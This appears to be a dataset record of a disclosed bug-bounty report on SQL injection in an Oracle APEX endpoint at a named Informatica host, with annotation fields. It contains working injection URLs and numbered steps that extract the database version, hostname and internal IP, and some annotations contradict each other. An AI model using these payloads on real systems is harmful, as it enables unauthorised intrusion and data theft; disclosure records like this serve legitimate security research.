@@ -1,0 +1,49 @@
+{
+  "reported_to": "Informatica",
+  "reported_by": "e3xpl0it ",
+  "title": "[afocusp.informatica.com] Sql injection  afocusp.informatica.com:37777",
+  "content": "\nhi !There is another sql injection on host afocusp.informatica.com:37777\nPOC\nversion\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version\nhostname of the database server\npsvlxtdapp1.inf\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual\nIP address of the database server (local)\n10.1.192.93\nhttp://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual\nPs\nYou need to patch all servers with the url /pls/apex/f? this is old bug in oracle.\n\n",
+  "severity": [
+    9.0,
+    10.0
+  ],
+  "bounty": null,
+  "weaknesses": [
+    "SQL Injection"
+  ],
+  "screenshots": {},
+  "disclosed_date": 1485043500,
+  "report_url": "https://hackerone.com/reports/178632",
+  "is_multi_component": true,
+  "complexity": "HIGH",
+  "novelty": "MEDIUM",
+  "vuln_category": "WEB_APP",
+  "steps": [
+    [
+      1,
+      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+*+from+v$version to retrieve the database version."
+    ],
+    [
+      2,
+      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'HOST',+15)+ipaddr+from+dual to retrieve the hostname of the database server."
+    ],
+    [
+      3,
+      "Access the URL http://afocusp.informatica.com:37777/pls/apex/f?);OWA_UTIL.CELLSPRINT(:1);--=select+SYS_CONTEXT('USERENV',+'IP_ADDRESS',+15)+ipaddr+from+dual to retrieve the IP address of the database server."
+    ]
+  ],
+  "vuln_description": "This vulnerability is a SQL injection in the Oracle APEX application hosted at afocusp.informatica.com:37777. The attacker can inject SQL queries via the URL parameter to retrieve sensitive information such as the database version, hostname, and IP address of the database server. The vulnerability exploits the OWA_UTIL.CELLSPRINT function in Oracle APEX, which is a known issue in older versions.",
+  "reason": "The vulnerability involves a straightforward SQL injection attack using a known exploit in Oracle APEX. The attack does not require multiple components, complex application states, or novel logic. The steps are simple and the interactions are obvious, making the discovery difficulty low.",
+  "new_complexity": "LOW",
+  "requires_code": false,
+  "requires_CVE": false,
+  "is_ctf": false,
+  "other_report": null,
+  "injection_metadata": {
+    "is_simple_payload": false
+  },
+  "authnz_metadata": {
+    "reason": "The SQL injection vulnerability involves direct manipulation of database queries through URL parameters, which is not related to authentication or authorization bypasses. The proposed methodologies focus on testing authorization boundaries by swapping user sessions or resource IDs, which does not apply to SQL injection vulnerabilities.",
+    "is_detectable": false
+  }
+}
